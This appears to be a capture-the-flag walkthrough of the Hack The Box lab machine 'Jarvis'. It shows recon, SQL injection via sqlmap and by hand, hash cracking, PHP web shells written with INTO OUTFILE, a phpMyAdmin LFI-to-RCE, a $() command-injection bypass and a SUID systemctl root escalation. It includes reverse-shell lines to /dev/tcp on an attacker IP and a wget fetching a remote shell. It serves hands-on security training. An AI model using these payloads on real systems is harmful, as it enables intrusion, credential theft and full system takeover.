# Jarvis

DIFFICULTY:: MEDI
KEYWORDS:: AFU, Executable, SQLi, phpMyAdmin
OS:: Linux
Property: Jarvis%202c6ef6729276453bbe90b4f7f2bf76e9/jarvis.png
Status:: ✅

10.10.10.143

Overview: 

[Summary](https://www.notion.so/9693c914b1504fb7ba734a871eba578c)

---

# Information Gathering

- Nmap:
    
    ```
    PORT   STATE SERVICE REASON  VERSION
    22/tcp open  ssh     syn-ack OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
    | ssh-hostkey: 
    |   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)
    | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzv4ZGiO8sDRbIsdZhchg+dZEot3z8++mrp9m0VjP6qxr70SwkE0VGu+GkH7vGapJQLMvjTLjyHojU/AcEm9MWTRWdpIrsUirgawwROic6HmdK2e0bVUZa8fNJIoyY1vPa4uNJRKZ+FNoT8qdl9kvG1NGdBl1+zoFbR9az0sgcNZJ1lZzZNnr7zv/Jghd/ZWjeiiVykomVRfSUCZe5qZ/aV6uVmBQ/mdqpXyxPIl1pG642C5j5K84su8CyoiSf0WJ2Vj8GLiKU3EXQzluQ8QJJPJTjj028yuLjDLrtugoFn43O6+IolMZZvGU9Man5Iy5OEWBay9Tn0UDSdjbSPi1X
    |   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)
    | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCDW2OapO3Dq1CHlnKtWhDucQdl2yQNJA79qP0TDmZBR967hxE9ESMegRuGfQYq0brLSR8Xi6f3O8XL+3bbWbGQ=
    |   256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)
    |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPuKufVSUgOG304mZjkK8IrZcAGMm76Rfmq2by7C0Nmo
    80/tcp open  http    syn-ack Apache httpd 2.4.25 ((Debian))
    | http-cookie-flags: 
    |   /: 
    |     PHPSESSID: 
    |_      httponly flag not set
    | http-methods: 
    |_  Supported Methods: GET HEAD POST OPTIONS
    |_http-server-header: Apache/2.4.25 (Debian)
    |_http-title: Stark Hotel
    64999/tcp open  http    Apache httpd 2.4.25 ((Debian))
    |_http-server-header: Apache/2.4.25 (Debian)
    |_http-title: Site doesn't have a title (text/html).
    ```
    

See: *supersecurehotel@logger.htb*

Try Sub-Domains:

- supersecurehotel.htb
- logger.htb

Nothing new..!

- Nikto: 80
    
    ```
    + Server: Apache/2.4.25 (Debian)
    + The anti-clickjacking X-Frame-Options header is not present.
    + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
    + Uncommon header 'ironwaf' found, with contents: 2.0.3
    + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
    + Cookie PHPSESSID created without the httponly flag
    + No CGI Directories found (use '-C all' to force check all possible dirs)
    + Apache/2.4.25 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
    + Web Server returns a valid response with junk HTTP methods, this may cause false positives.
    + OSVDB-3268: /css/: Directory indexing found.
    + OSVDB-3092: /css/: This might be interesting...
    + Uncommon header 'x-ob_mode' found, with contents: 1
    + OSVDB-3092: /phpmyadmin/ChangeLog: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
    + OSVDB-3268: /images/: Directory indexing found.
    + OSVDB-3233: /icons/README: Apache default file found.
    + /phpmyadmin/: phpMyAdmin directory found
    + OSVDB-3092: /phpmyadmin/README: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
    ```
    

## Page: phpMyAdmin

- [http://supersecurehotel.htb/phpmyadmin/](http://supersecurehotel.htb/phpmyadmin/)
- [http://supersecurehotel.htb/phpmyadmin/ChangeLog](https://www.supersecurehotel.htb/phpmyadmin/ChangeLog)
→ Version: 4.8.0

## Check for SQL-Injection

We see the Url parameter cod !

- [http://supersecurehotel.htb/room.php?cod=](http://supersecurehotel.htb/room.php?cod=1%20union%20select%201,2,3,4,5,6,7)

We see there are 1-6 Rooms. Cod 1,2,3,4,5,6 works.

We can do cod=`5-3` , and see the 2 Room. There is a Math functions here.

**Sql Statments** cod=`hex(2)` works to. 

### 1. **Methode - SQLMap**

- `sqlmap -u [http://supersecurehotel.htb/room.php?cod=](http://supersecurehotel.htb/room.php?cod=) --random-agent --level=5 --risk=3 --dbs`
    
    INFO: It can happen that the side block 90 secounds
    
    - **GET parameter 'cod' is vulnerable.**
        
        ```
        sqlmap identified the following injection point(s) with a total of 
        10245 HTTP(s) requests:
        ---
        Parameter: cod (GET)
            Type: boolean-based blind
            Title: OR boolean-based blind - WHERE or HAVING clause
            Payload: cod=-9619 OR 6777=6777
        
            Type: time-based blind
            Title: MySQL >= 5.0.12 time-based blind - Parameter replace
            Payload: cod=(CASE WHEN (2722=2722) THEN SLEEP(5) ELSE 2722 END)
        
            Type: UNION query
            Title: Generic UNION query (random number) - 7 columns
            Payload: cod=-3493 UNION ALL SELECT 8143,CONCAT(0x717a6b6b71,
        0x6853505772764a6278416d7146537356464345556c45725a696c596b624a414956716
        a6c66787978,0x71706b6a71),8143,8143,8143,8143,8143-- -
        ---
        ```
        
        SqlMap check and confirmed the **7 Colums** !
        
        ![Untitled](Jarvis%202c6ef6729276453bbe90b4f7f2bf76e9/Untitled.png)
        
    
    **Find Databases Names:**
    
    ```
    available databases [4]:                                                                                                        
    [*] hotel
    [*] information_schema
    [*] mysql
    [*] performance_schema
    ```
    
    - `sudo sqlmap -u [http://supersecurehotel.htb/room.php?cod=](http://supersecurehotel.htb/room.php?cod=) --random-agent --level=5 --risk=3 --database "hotel" --tables`
        - Find all Tables from all Databases !
            
            ```
            Database: hotel                                                                                                                 
            [1 table]
            +----------------------------------------------------+
            | room                                               |
            +----------------------------------------------------+
            
            Database: information_schema
            [78 tables]
            +----------------------------------------------------+
            | ALL_PLUGINS                                        |
            | APPLICABLE_ROLES                                   |
            | CHANGED_PAGE_BITMAPS                               |
            ...
            | INDEX_STATISTICS                                   |
            | KEY_CACHES                                         |
            | KEY_COLUMN_USAGE                                   |
            | PARAMETERS                                         |
            | PARTITIONS                                         |
            | PLUGINS                                            |
            | PROCESSLIST                                        |
            | SYSTEM_VARIABLES                                   |
            | TABLES                                             |
            | TABLESPACES                                        |
            | TABLE_CONSTRAINTS                                  |
            | USER_STATISTICS                                    |
            | VIEWS                                              |
            | XTRADB_INTERNAL_HASH_TABLES                        |
            | XTRADB_READ_VIEW                                   |
            | XTRADB_RSEG                                        |
            +----------------------------------------------------+
            
            Database: mysql
            [30 tables]
            +----------------------------------------------------+
            | user                                               |
            | column_stats                                       |
            ...
            | time_zone_leap_second                              |
            | time_zone_transition_type                          |
            +----------------------------------------------------+
            
            Database: performance_schema
            [52 tables]
            +----------------------------------------------------+
            | accounts                                           |
            ...
            | threads                                            |
            | users                                              |
            +----------------------------------------------------+
            ```
            
        - `sudo sqlmap -u [http://supersecurehotel.htb/room.php?cod=](http://supersecurehotel.htb/room.php?cod=) --random-agent --level=5 --risk=3 -D "mysql" -T user --dump`
        
        Find Input from Table user: Username, Password-Hash 
        ***And Successfully cack it!***
        
        DBadmin - 2D2B7A5E4E637B8FBA1D17F40318F277D29964D0 - imissyou
        
    - `sqlmap -u [http://supersecurehotel.htb/room.php?cod=1](http://supersecurehotel.htb/room.php?cod=1) --random-agent --batch --is-dba`
        
        current user is DBA: True
        
    
    Now we can read and write fiels on the system
    
    Read /etc/passwd 
    
    - `sqlmap -u [http://supersecurehotel.htb/room.php?cod=1](http://supersecurehotel.htb/room.php?cod=1) --random-agent --batch --file-read="/etc/passwd"`
    
    Fast OS-Shell
    
    - `sqlmap -u [http://supersecurehotel.htb/room.php?cod=1](http://supersecurehotel.htb/room.php?cod=1) --random-agent --batch --os-shell`
    
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    
    ---
    

### 2. **Methode - by hand**

**Operator - [untion](https://www.techonthenet.com/mysql/union.php)**

We can check how many columns the table have:

- ?cod=1 union select 1

This give us an Fail so there are more columns!

![Fail](Jarvis%202c6ef6729276453bbe90b4f7f2bf76e9/Untitled%201.png)

Fail

- ?cod=1 union select 1,2,3,4,5,6,7

Now we know the table have 7 columns !

![Work](Jarvis%202c6ef6729276453bbe90b4f7f2bf76e9/Untitled%202.png)

Work

- ?cod=999 union select 1,2,3,4,5,6,7

The room 999 dont exist. We see which numbers stand for which output !

![Trigger](Jarvis%202c6ef6729276453bbe90b4f7f2bf76e9/Untitled%203.png)

Trigger

- Nr: 2 = Room-Name
- Nr: 3 = Price
- Nr: 4 = Description
- Nr: 5 = Ranking

### MySQL SQL Injection Cheat Sheet [🔗](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)

- ?cod=999 union select 1,2,(**SELECT @@version**),4,5,6,7

We can add queries in the union operator like Version : `SELECT @@version`

![Untitled](Jarvis%202c6ef6729276453bbe90b4f7f2bf76e9/Untitled%204.png)

Version: 10.1.37 - MariaDB -0+deb9u1

**Operator - [GROUP_CONCAT](https://www.educative.io/edpresso/what-is-the-groupconcat-function-in-mysql)** 

<aside>
💡 GROUP_CONCAT is a function which **concatenates/merges the data from multiple rows into one field**. It is a GROUP BY function which returns a string if the group contains at least 1 non-null value, if it does not, it returns a Null value.

</aside>

Look at [🔗](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet) we see: 

> List Password Hashes: `SELECT host, user, password FROM mysql.user`
> 

This dont work, the GROUP_CONCAT Operator is needed ! 

- ?cod=999 union select 1,2,(SELECT group_concat(host, user, password) FROM mysql.user),4,5,6,7

→ [localhost](http://localhost), DBadmin, 2D2B7A5E4E637B8FBA1D17F40318F277D29964D0

---

***Exact SQL Enumeration***

- **Check Database - hotel**
    
    ### Some queries and there Output:
    
    Current Database Name:
    
    - SELECT database() 
    → hotel
    
    Current User Name:
    
    - SELECT user() 
    → DBadmin@localhost
    
    Database Name:
    
    - SELECT group_concat(Schema_NAME) FROM Information_Schema.SCHEMATA
    → hotel, information_schema, mysql, performance_schema
    
    Table Names:
    
    - SELECT group_concat(TABLE_NAME) FROM Information_Schema.TABLES WHERE TABLE_SCHEMA = 'hotel'
    → room
    
    Colum Name:
    
    - SELECT group_concat(COLUMN_NAME) FROM Information_Schema.COLUMNS WHERE TABLE_SCHEMA = 'hotel'
    → cod, name, price, descrip, star, image, mini
    - *Table and Colum Name clean output:*
        - ?cod=999 union select 1,2,(select group_concat(TABLE_NAME,":",COLUMN_NAME,"\r\n") from Information_Schema.COLUMNS where TABLE_SCHEMA = 'hotel'),4,5,6,7
        
        ```
        1. room:cod
        2. room:name
        3. room:price
        4. room:descrip
        5. room:star
        6. room:image
        7. room:mini
        ```
        
    
    ### Now we know:
    
    - Database Name: **hotel**
    - Tablename: **room**
    - All 7 Colum Names: **cod, name, price, descrip, star, image, mini**
    
    In this Database and Table is nothing Iterersitng...
    
- **Check Database - mysql**
    
    ***Info:** Use `\r\n` for the last group_concat() paramter, for better Output.*
    
    - Print only all Table Names:
        - SELECT group_concat(TABLE_NAME,"\r\n") FROM Information_Schema.TABLES WHERE TABLE_SCHEMA = 'mysql'
            
            ```
            column_stats 
            columns_priv 
            db 
            event 
            func 
            general_log 
            gtid_slave_pos 
            help_category 
            help_keyword 
            help_relation 
            help_topic 
            host
            index_stats 
            innodb_index_stats 
            innodb_table_stats 
            plugin 
            proc 
            procs_priv 
            proxies_priv 
            roles_mapping 
            servers 
            slow_log 
            table_stats 
            tables_priv 
            time_zone 
            time_zone_leap_second 
            time_zone_name 
            time_zone_transition 
            time_zone_transition_type 
            user
            ```
            
    
    Print Table Names and the Culomn Names:
    
    - SELECT group_concat(TABLE_NAME,":",COLUMN_NAME,"\r\n") FROM Information_Schema.COLUMNS WHERE TABLE_SCHEMA = 'mysql'
    
    ```
    column_stats:db_name 
    column_stats:table_name 
    column_stats:column_name 
    column_stats:min_value 
    column_stats:max_value 
    column_stats:nulls_ratio 
    column_stats:avg_length 
    column_stats:avg_frequency 
    column_stats:hist_size 
    column_stats:hist_type 
    column_stats:histogram 
    columns_priv:Host 
    columns_priv:Db 
    columns_priv:User 
    columns_priv:Table_name 
    columns_priv:Column_name 
    columns_priv:Timestamp 
    columns_priv:Column_priv 
    db:Host 
    db:Db 
    db:User 
    db:Select_priv 
    db:Insert_priv 
    db:Update_priv
    db:Delete_priv 
    db:Create_priv 
    db:Drop_priv 
    db:Grant_priv 
    db:References_priv 
    db:Index_priv 
    db:Alter_priv 
    db:Create_tmp_table_priv 
    db:Lock_tables_priv 
    db:Create_view_priv 
    db:Show_view_priv
    db:Create_routine_priv 
    db:Alter_routine_priv 
    db:Execute_priv 
    db:Event_priv
    db:Trigger_priv 
    event:db 
    event:name 
    event:body 
    event:definer 
    event:execute_at 
    event:interval_value 
    event:interval_field 
    event:created 
    event:modified 
    event:last_executed 
    event:starts 
    ```
    
    - Find Table user:
    

Operator - [LOAD_FILE](https://www.w3resource.com/mysql/string-functions/mysql-load_file-function.php)

We can read files on the system.

- `LOAD_FILE('/etc/passwd')`
- Read room.php and conection.php to find infos of the cod parameter and the 
User and Password für phpMyAdmin.
    
    Info: *We need to encode the PhP file with base64 to read it !*
    
    ### room.php
    
    - `TO_base64(LOAD_FILE('/var/www/html/room.php'))`
        
        We see the Function for the cod Parameter.
        
        ```php
        if($_GET['cod']){
           include("connection.php");
            include("roomobj.php");
            $result=$connection->query("select * from room where cod=".$_GET['cod']);
            $line=mysqli_fetch_array($result);
            $room=new Room();
            $room->cod=$line['cod'];
            $room->name=$line['name'];
            $room->price=$line['price'];
            $room->star=$line['star'];
            $room->image=$line['image'];
            $room->mini=$line['mini'];
            $room->descrip=$line['descrip'];
          }
        else{
          header("Location:index.php");
          }
        ```
        
    
    ### connection.php
    
    - `TO_base64(LOAD_FILE('/var/www/html/connection.php'))`
    
    ```php
    <?php
    $connection=new mysqli('127.0.0.1','DBadmin','imissyou','hotel');
    ?>
    ```
    

### Hashcat:

Hash Format: 300 | MySQL4.1/MySQL5

- `hashcat -m 300 hash /usr/share/wordlists/rockyou.txt`

Password: imissyou

**Login in phpMyAdmin:** DBadmin:imissyou

---

# Gaining Access

## 1. SQL (INTO OUTFILE) - RCE

**1. Methode: Crate File with  SQL Command**

On the phpMyAdmin is a SQL query box: [http://logger.htb/phpmyadmin/server_sql.php](http://logger.htb/phpmyadmin/server_sql.php)

We can crate a PhP Web-Shell file in the images folder. (*We need write permissions on this folder*) 

```
SELECT "<?=`$_GET[cmd]`?>" INTO OUTFILE "/var/www/html/images/shell.php"
```

- http://logger.htb/images/test1.php?cmd=id
→ uid=33(www-data) gid=33(www-data) groups=33(www-data)
- http://logger.htb/images/test1.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.22%2F1234%200%3E%261%27

**Extra: With cod Parameter:** (*no phpMyAdmin Login needed*)

- SELECT "<?=`$_GET[cmd]`?>" ⇒ URL-Decode ⇒ select+'<%3f%3d`$_GET[cmd]`%3f>'
- INTO OUTFILE '/var/www/html/images/shell.php'
    - ?code=999 union select "1","2",(select+'<%3f%3d`$_GET[cmd]`%3f>'),"4","5","6","7" INTO OUTFILE '/var/www/html/images/shell.php'

![Untitled](Jarvis%202c6ef6729276453bbe90b4f7f2bf76e9/Untitled%205.png)

## 2. phpMyAdmin 4.8.0 - RCE

**2. Metode: phpMyAdmin 4.8.x LFI to RCE 
(Authorization Required) [🔗](https://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-Authorited-CLI-to-RCE/)**

**Upload PhP File**

1. Execute SQL Command on phpMyAdmin:

```
select '<?php exec("wget -O /var/www/html/shell.php http://10.10.14.22/shell.php"); ?>'
```

1. Copy phpMyAdmin Cookie: oas3t6nafq60at0c13e60svq1vfk8dch
2. Go to the URL:
    - [http://logger.htb/phpmyadmin](http://logger.htb/phpmyadmin/)/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_oas3t6nafq60at0c13e60svq1vfk8dch
3. File is uploaded: [http://logger.htb/](http://logger.htb/phpmyadmin/)shell.php

---

# Privilege Escalation - User

- `sudo -l`
    
    ```
    User www-data may run the following commands on jarvis:
    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
    ```
    
    - Full [simpler.py](http://simpler.py)
        
        ```python
        #!/usr/bin/env python3
        from datetime import datetime
        import sys
        import os
        from os import listdir
        import re
        
        def show_help():
            message='''
        ********************************************************
        * Simpler   -   A simple simplifier ;)                 *
        * Version 1.0                                          *
        ********************************************************
        Usage:  python3 simpler.py [options]
        
        Options:
            -h/--help   : This help
            -s          : Statistics
            -l          : List the attackers IP
            -p          : ping an attacker IP
            '''
            print(message)
        
        def show_header():
            print('''***********************************************
             _                 _                       
         ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
        / __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
        \__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
        |___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                        |_|               |_|    |___/ 
                                        @ironhackers.es
                                        
        ***********************************************
        ''')
        
        def show_statistics():
            path = '/home/pepper/Web/Logs/'
            print('Statistics\n-----------')
            listed_files = listdir(path)
            count = len(listed_files)
            print('Number of Attackers: ' + str(count))
            level_1 = 0
            dat = datetime(1, 1, 1)
            ip_list = []
            reks = []
            ip = ''
            req = ''
            rek = ''
            for i in listed_files:
                f = open(path + i, 'r')
                lines = f.readlines()
                level2, rek = get_max_level(lines)
                fecha, requ = date_to_num(lines)
                ip = i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3]
                if fecha > dat:
                    dat = fecha
                    req = requ
                    ip2 = i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3]
                if int(level2) > int(level_1):
                    level_1 = level2
                    ip_list = [ip]
                    reks=[rek]
                elif int(level2) == int(level_1):
                    ip_list.append(ip)
                    reks.append(rek)
                f.close()
        	
            print('Most Risky:')
            if len(ip_list) > 1:
                print('More than 1 ip found')
            cont = 0
            for i in ip_list:
                print('    ' + i + ' - Attack Level : ' + level_1 + ' Request: ' + reks[cont])
                cont = cont + 1
        	
            print('Most Recent: ' + ip2 + ' --> ' + str(dat) + ' ' + req)
        	
        def list_ip():
            print('Attackers\n-----------')
            path = '/home/pepper/Web/Logs/'
            listed_files = listdir(path)
            for i in listed_files:
                f = open(path + i,'r')
                lines = f.readlines()
                level,req = get_max_level(lines)
                print(i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3] + ' - Attack Level : ' + level)
                f.close()
        
        def date_to_num(lines):
            dat = datetime(1,1,1)
            ip = ''
            req=''
            for i in lines:
                if 'Level' in i:
                    fecha=(i.split(' ')[6] + ' ' + i.split(' ')[7]).split('\n')[0]
                    regex = '(\d+)-(.*)-(\d+)(.*)'
                    logEx=re.match(regex, fecha).groups()
                    mes = to_dict(logEx[1])
                    fecha = logEx[0] + '-' + mes + '-' + logEx[2] + ' ' + logEx[3]
                    fecha = datetime.strptime(fecha, '%Y-%m-%d %H:%M:%S')
                    if fecha > dat:
                        dat = fecha
                        req = i.split(' ')[8] + ' ' + i.split(' ')[9] + ' ' + i.split(' ')[10]
            return dat, req
        			
        def to_dict(name):
            month_dict = {'Jan':'01','Feb':'02','Mar':'03','Apr':'04', 'May':'05', 'Jun':'06','Jul':'07','Aug':'08','Sep':'09','Oct':'10','Nov':'11','Dec':'12'}
            return month_dict[name]
        	
        def get_max_level(lines):
            level=0
            for j in lines:
                if 'Level' in j:
                    if int(j.split(' ')[4]) > int(level):
                        level = j.split(' ')[4]
                        req=j.split(' ')[8] + ' ' + j.split(' ')[9] + ' ' + j.split(' ')[10]
            return level, req
        	
        def exec_ping():
            forbidden = ['&', ';', '-', '`', '||', '|']
            command = input('Enter an IP: ')
            for i in forbidden:
                if i in command:
                    print('Got you')
                    exit()
            os.system('ping ' + command)
        
        if __name__ == '__main__':
            show_header()
            if len(sys.argv) != 2:
                show_help()
                exit()
            if sys.argv[1] == '-h' or sys.argv[1] == '--help':
                show_help()
                exit()
            elif sys.argv[1] == '-s':
                show_statistics()
                exit()
            elif sys.argv[1] == '-l':
                list_ip()
                exit()
            elif sys.argv[1] == '-p':
                exec_ping()
                exit()
            else:
                show_help()
                exit()
        ```
        
    
    Python Library Hijacking dont work here!
    → sudo: sorry, you are not allowed to set the following environment variables: PYTHONPATH
    
- `sudo -u pepper /var/www/Admin-Utilities/simpler.py -h`
    
    ```
    Options:
        -h/--help   : This help
        -s          : Statistics
        -l          : List the attackers IP
        **-p          : ping an attacker IP**
    ```
    
    The Python Script execute the ping command
    
    - [simpler.py](http://simpler.py) exec_ping() Function:
        
        ```python
        def exec_ping():
            forbidden = ['&', ';', '-', '`', '||', '|']
            command = input('Enter an IP: ')
            for i in forbidden:
                if i in command:
                    print('Got you')
                    exit()
            os.system('ping ' + command)
        ```
        
    
    We need to execute a secound command after the IP. (set ping 99. it needs to fail)
    
    - `99. ; id`
    don't work here, because ; is in the forbidden Array !
    
    Find a combination without the forbidden sign ...
    
    - `99. $(id)`
    -> groups=1000(pepper)
    This work and $ is not in the forbidden Array.

## $(command) - RCE

**1. Methode: Run [rev.sh](http://rev.sh) file**

We can execute the reverse shell code in the $() command, 
so we crate a file with the forbidden strings and run it.

```bash
#!/usr/bin/bash
bash -i >& /dev/tcp/10.10.14.22/9001 0>&1
```

- `sudo -u pepper /var/www/Admin-Utilities/simpler.py -p`
    - `99. $(bash /tmp/rev.sh)`

**2. Methode: /bin/bash pepper file**

Create a copy of bash and set SGID, and it will be owned by pepper.

- `sudo -u pepper /var/www/Admin-Utilities/simpler.py -p`
    - `99. $(/bin/cp /bin/bash /tmp/pepper)`
    - `99. $(chmod +s /tmp/pepper)`
- `/tmp/pepper -p`

→ uid=1000(pepper) gid=1000(pepper) groups=1000(pepper)

---

# Privilege Escalation - Root

**Linpeas.sh**

[+] SUID - Check easy privesc, exploits and write perms

rwsr-x--- 1 root **pepper** 171K Feb 17 2019 /bin/systemctl

## GTFOBins - systemctl [📌](https://gtfobins.github.io/gtfobins/systemctl/)

```
TF=$(mktemp)
echo /bin/sh >$TF
chmod +x $TF
SYSTEMD_EDITOR=$TF /bin/systemctl edit system.slice
```

→ uid=1000(pepper) gid=1000(pepper) euid=0(root) groups=1000(pepper)
